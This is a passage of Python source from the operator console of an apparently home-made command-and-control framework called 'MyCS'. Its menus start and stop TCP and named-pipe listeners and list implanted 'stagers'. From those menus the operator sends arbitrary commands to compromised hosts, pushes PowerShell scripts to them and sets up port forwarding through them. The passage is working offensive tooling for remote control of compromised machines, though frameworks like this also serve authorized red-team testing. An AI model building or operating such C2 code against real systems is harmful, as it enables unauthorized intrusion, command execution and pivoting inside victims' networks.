                if command_id == self.__t_myconstant.CMD_USEPIPELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_LISTENER
                    continue

                if command_id == self.__t_myconstant.CMD_PIPE_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_PIPE_INTE_STAGER
                    continue
                
                if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                    continue
                
                # main menu
                if command_id == self.__t_myconstant.CMD_EXIT:
                    print("Thanks for using MyCS..")
                    exit()
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_main()
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_LISTENER: # Listener menu

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                # listener menu
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_listener()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_GETINFO:
                    self.__t_myserver.print_info()
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETHOSTNAME:
                    user_input = input("Please enter the hostname to listen on: ")
                    self.__t_myserver.set_hostname(user_input)
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_SETPORT:
                    user_input = input("Please enter the port number to listen on: ")
                    self.__t_myserver.set_portnumber(int(user_input))
                    continue

                if command_id == self.__t_myconstant.CMD_LISTENER_LIST:
                    self.__t_myserver.print_listener()
                
                if command_id == self.__t_myconstant.CMD_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
                    #set auto compete to listener uuid
                    setautocomplete(self.__t_myserver.get_listener())

                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_listener(user_input_listener)
                    continue
            
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:

                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                
                if command_id == self.__t_myconstant.CMD_HELP:
                    self.__cmd_list_stager()
                    continue

                # stager inte menu
                if command_id == self.__t_myconstant.CMD_STAGER_GET_LIST:
                    self.__t_myserver.print_stager()
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
                        print(each_msg)
                    continue

                if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                
                if command_id == self.__t_myconstant.CMD_STAGER_LOAD_PS:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue

                    t_psloader = ps_loader()
                    #set auto compete for filename
                    setautocomplete(t_psloader.psfiles)
                    user_input_psfile = input("Please enter psfile to load: ")
                    t_result = t_psloader.load_ps(user_input_psfile)
                    #call psrun with tag psload
                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)

                if command_id == self.__t_myconstant.CMD_STAGER_CON:
                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_host = input("Please enter target ip: ")
                    user_input_port = input("Please enter target port: ")
                    self.__t_myserver.start_client(user_input_host,int(user_input_port))

                if command_id ==  self.__t_myconstant.CMD_STAGER_PFW:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_listener_host = input("Please enter listener ip: ")
                    user_input_listener_port = input("Please enter listener port: ")
                    user_input_con_host = input("Please enter connect ip: ")
                    user_input_con_port = input("Please enter connect port: ")
                    # wait local resource handler return true
                    threading.Thread(target=self.__t_myserver.start_resource_handler,args=(user_input_stager,user_input_con_host,int(user_input_con_port),)).start()
                    #pull the response
                    t_response = self.__t_myserver.get_resource_handler_result(user_input_stager)
                    if t_response == self.__t_net_constant.FW_LOCAL_SUCCESS:
                        self.__t_myserver.create_command(user_input_stager,"fw","{}:{}".format(user_input_listener_host,user_input_listener_port))
                        threading.Thread(target=self.__t_myserver.start_slave_worker,args=(user_input_stager,)).start()
                    else:
                        print("Cannot connect to local resource")

            #next cmd

            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                # menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_GETINFO:
                    self.__t_myserver.print_pipe_info()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_START:
                    threading.Thread(target=self.__t_myserver.start_pipe_listener).start()
                    continue
                
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_SETPIPENAME:
                    removecomplete()
                    user_input_pipename = input("Please enter the pipename: ")
                    self.__t_myserver.set_pipename(user_input_pipename)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_STOP:
                    #set auto compete to listener uuid
                    setautocomplete(self.__t_myserver.get_pipe_listener())
                    user_input_listener = input("Please enter the listener uuid: ")
                    if user_input_listener not in self.__t_myserver.get_pipe_listener():
                        print("Please input a valid listener uuid")
                        continue
                    self.__t_myserver.stop_pipe_listener(user_input_listener)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_LIST:
                    self.__t_myserver.print_pipe_listener()
                    continue

            
            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                #menu switch
                if command_id == self.__t_myconstant.CMD_BACK:
                    cmd_tag = self.__t_myconstant.TAG_MYCS
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_LIST:
                    self.__t_myserver.print_pipe_stager()
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_INTO:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_running_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_running_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue

                    #unset auto complete
                    removecomplete()
                    user_input_command_tag = input("Please enter the command tag: ")
                    user_input_command = input("Please enter the command: ")
                    self.__t_myserver.create_pipe_command(user_input_stager,user_input_command_tag,user_input_command)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_HISTORY:
                    #set auto compete to stager uuid
                    setautocomplete(self.__t_myserver.get_pipe_stager())

                    user_input_stager = input("Please enter the stager uuid: ")
                    if user_input_stager not in self.__t_myserver.get_pipe_stager():
                        print("Please input a valid stager uuid")
                        continue
                    for each_msg in self.__t_myserver.get_pipe_history()[user_input_stager]:
                        print(each_msg)
                    continue
                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_GET_RUNNING_LIST:
                    self.__t_myserver.print_pipe_stager_running()
                    continue

                if command_id == self.__t_myconstant.CMD_PIPE_STAGER_CON:
                    #unset auto complete
                    removecomplete()
                    #get host and port
                    user_input_host = input("Please enter hostname or ip: ")
                    user_input_pipename = input("Please enter pipename: ")
                    self.__t_myserver.start_pipe_client(user_input_host,user_input_pipename)




if __name__ == "__main__":

    t_mymainclass = mymainclass()
    t_mymainclass.main()

